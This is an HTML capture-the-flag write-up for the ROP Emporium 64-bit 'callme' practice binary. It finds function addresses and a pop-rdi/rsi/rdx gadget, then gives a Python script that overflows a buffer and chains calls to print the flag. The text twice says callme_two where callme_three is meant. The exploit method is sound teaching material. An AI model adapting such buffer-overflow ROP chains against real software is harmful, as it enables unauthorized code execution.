@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#ROP Emporium - 64bit - callme</strong></h1>
+        <a href="https://ropemporium.com/challenge/callme.html">https://ropemporium.com/challenge/callme.html</a><br>
+        <br>
+        <img alt="images\5-1.png" src="images/5-1.png"><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>Challenge Description</strong></h2><br>
+        Description for <code>callme</code> on ropemporium:<br>
+            <div class="codebox">
+                Reliably&nbsp;make&nbsp;consecutive&nbsp;calls&nbsp;to&nbsp;imported&nbsp;functions.&nbsp;Use&nbsp;some&nbsp;new&nbsp;techniques&nbsp;and&nbsp;learn&nbsp;about&nbsp;the&nbsp;Procedure&nbsp;Linkage&nbsp;Table.<br>
+                <br>
+                Correct&nbsp;Order<br>
+                You&nbsp;must&nbsp;call&nbsp;callme_one(),&nbsp;callme_two()&nbsp;and&nbsp;callme_three()&nbsp;in&nbsp;that&nbsp;order,&nbsp;each&nbsp;with&nbsp;the&nbsp;arguments&nbsp;1,2,3&nbsp;e.g.&nbsp;callme_one(1,2,3)&nbsp;to&nbsp;print&nbsp;the&nbsp;flag.
+            </div>
+        </div><br>
+        <br>
+        Our goal, as described, is to run <code>callme_one</code>, <code>callme_two</code> and <code>callme_two</code> with the paramaters <code>1</code>, <code>2</code> and <code>3</code>.<br>
+        For this, we have to build a ROP chain.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>1) Find the addresses of callme functions</strong></h2><br>
+        Read the binary's imports to find the <code>callme_one</code> etc. functions and their Virtual Address in the binary<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/3-callme#&nbsp;rabin2&nbsp;-i&nbsp;callme<br>
+                [Imports]<br>
+                Num&nbsp;&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;1&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;_ITM_deregisterTMCloneTable<br>
+                &nbsp;&nbsp;&nbsp;2&nbsp;0x004017f0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;puts<br>
+                &nbsp;&nbsp;&nbsp;3&nbsp;0x00401800&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;printf<br>
+                &nbsp;&nbsp;&nbsp;4&nbsp;0x00401810&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;callme_three<br>
+                &nbsp;&nbsp;&nbsp;5&nbsp;0x00401820&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;memset<br>
+                &nbsp;&nbsp;&nbsp;6&nbsp;0x00401830&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;__libc_start_main<br>
+                &nbsp;&nbsp;&nbsp;7&nbsp;0x00401840&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;fgets<br>
+                &nbsp;&nbsp;&nbsp;8&nbsp;0x00401850&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;callme_one<br>
+                &nbsp;&nbsp;&nbsp;9&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__<br>
+                &nbsp;&nbsp;10&nbsp;0x00401860&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;setvbuf<br>
+                &nbsp;&nbsp;11&nbsp;0x00401870&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;callme_two<br>
+                &nbsp;&nbsp;12&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;_Jv_RegisterClasses<br>
+                &nbsp;&nbsp;13&nbsp;0x00401880&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;exit<br>
+                &nbsp;&nbsp;14&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;_ITM_registerTMCloneTable<br>
+                &nbsp;&nbsp;&nbsp;1&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;_ITM_deregisterTMCloneTable<br>
+                &nbsp;&nbsp;&nbsp;9&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__<br>
+                &nbsp;&nbsp;12&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;_Jv_RegisterClasses<br>
+                &nbsp;&nbsp;14&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;_ITM_registerTMCloneTable
+            </div>
+        </div><br>
+        <br>
+        callme_one is at <code>0x00401850</code><br>
+        callme_two is at <code>0x00401870</code><br>
+        callme_three is at <code>0x00401810</code><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>2) Find gadget to set up callme parameters</strong></h2><br>
+        Each of these functions need to be called with three parameters - <code>1</code>, <code>2</code> and <code>3</code> - <code>callme_one(1, 2, 3)</code><br>
+        The order of registers in 64-bit calling conventions is RDI, RSI, RDX, RCX etc.<br>
+        <br>
+        Therefore:<br>
+        • <code>1</code> needs to be in RDI<br>
+        • <code>2</code> needs to be in RSI<br>
+        • <code>3</code> needs to be in RDX<br>
+        <br>
+        Because of this, we need to find a <code>pop rdi; pop rsi; pop rdx; ret</code> instruction.<br>
+        Thankfully, we've been given one.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/3-callme#&nbsp;gdb&nbsp;-q&nbsp;callme<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;callme...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;break&nbsp;main<br>
+                Breakpoint&nbsp;1&nbsp;at&nbsp;0x40199a<br>
+                gdb-peda$&nbsp;run<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ropemporium/3-callme/callme&nbsp;<br>
+                <br>
+                ...<br>
+                <br>
+                Breakpoint&nbsp;1,&nbsp;0x000000000040199a&nbsp;in&nbsp;main&nbsp;()<br>
+                gdb-peda$&nbsp;ropsearch&nbsp;"pop&nbsp;rdi;&nbsp;pop&nbsp;rsi;&nbsp;pop&nbsp;rdx;&nbsp;ret"<br>
+                Searching&nbsp;for&nbsp;ROP&nbsp;gadget:&nbsp;'pop&nbsp;rdi;&nbsp;pop&nbsp;rsi;&nbsp;pop&nbsp;rdx;&nbsp;ret'&nbsp;in:&nbsp;binary&nbsp;ranges<br>
+                0x00401ab0&nbsp;:&nbsp;(b'5f5e5ac3') pop&nbsp;rdi;&nbsp;pop&nbsp;rsi;&nbsp;pop&nbsp;rdx;&nbsp;ret
+            </div>
+        </div><br>
+        <br>
+        A pop instruction for our parameters is available at <code>0x00401ab0</code>.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>3) Write exploit script</strong></h2><br>
+        At this point, we have everything we need to run <code>callme_one</code>, <code>callme_two</code> and <code>callme_two</code> with the paramaters <code>1</code>, <code>2</code> and <code>3</code>.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>Exploit plan</strong></h3><br>
+        1. Overflow the buffer with 40 bytes of junk<br>
+        2. Overwrite RIP with our <code>pop pop pop ret</code> instruction<br>
+        1) write <code>1</code> to the stack for it be popped into RDI<br>
+        2) write <code>2</code> to the stack for it be popped into RSI<br>
+        3) write <code>3</code> to the stack for it be popped into RDX<br>
+        3. Write the address of callme_one to the stack<br>
+        ◇ <code>ret</code> from <code>pop pop pop ret</code> will run the <code>callme_one</code> function<br>
+        4. Repeat the above for <code>callme_two</code> and <code>callme_three</code> functions<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>Python Script</strong></h3><br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
+                <br>
+                pop_pop_pop_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00401ab0</span>)&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;rdi;&nbsp;pop&nbsp;rsi;&nbsp;pop&nbsp;rdx;&nbsp;ret</span><br>
+                one&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x1</span>)<br>
+                two&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x2</span>)<br>
+                three&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x3</span>)<br>
+                <br>
+                callme_one_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00401850</span>)<br>
+                callme_two_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00401870</span>)<br>
+                callme_three_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00401810</span>)<br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#Stage&nbsp;1&nbsp;-&nbsp;callme_one</span><br>
+                payload&nbsp;+=&nbsp;pop_pop_pop_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;one&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;1&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;two&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;2&nbsp;into&nbsp;RSI</span><br>
+                payload&nbsp;+=&nbsp;three&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;3&nbsp;into&nbsp;RDX</span><br>
+                payload&nbsp;+=&nbsp;callme_one_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;callme_one()</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#Stage&nbsp;2&nbsp;-&nbsp;callme_two</span><br>
+                payload&nbsp;+=&nbsp;pop_pop_pop_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;from&nbsp;callme_one&nbsp;to&nbsp;pop&nbsp;pop&nbsp;pop&nbsp;ret</span><br>
+                payload&nbsp;+=&nbsp;one&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;1&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;two&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;2&nbsp;into&nbsp;RSI</span><br>
+                payload&nbsp;+=&nbsp;three&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;3&nbsp;into&nbsp;RDX</span><br>
+                payload&nbsp;+=&nbsp;callme_two_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;callme_two()</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#Stage&nbsp;3&nbsp;=&nbsp;callme_three</span><br>
+                payload&nbsp;+=&nbsp;pop_pop_pop_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;from&nbsp;callme_three&nbsp;to&nbsp;pop&nbsp;pop&nbsp;pop&nbsp;ret</span><br>
+                payload&nbsp;+=&nbsp;one&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;1&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;two&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;2&nbsp;into&nbsp;RSI</span><br>
+                payload&nbsp;+=&nbsp;three&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;3&nbsp;into&nbsp;RDX</span><br>
+                payload&nbsp;+=&nbsp;callme_three_addr&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;callme_three()</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>4) Win!</strong></h2><br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/3-callme#&nbsp;python&nbsp;callmepwn.py&nbsp;|&nbsp;./callme<br>
+                callme&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                Hope&nbsp;you&nbsp;read&nbsp;the&nbsp;instructions...<br>
+                &gt;&nbsp;ROPE{a_placeholder_32byte_flag!}
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
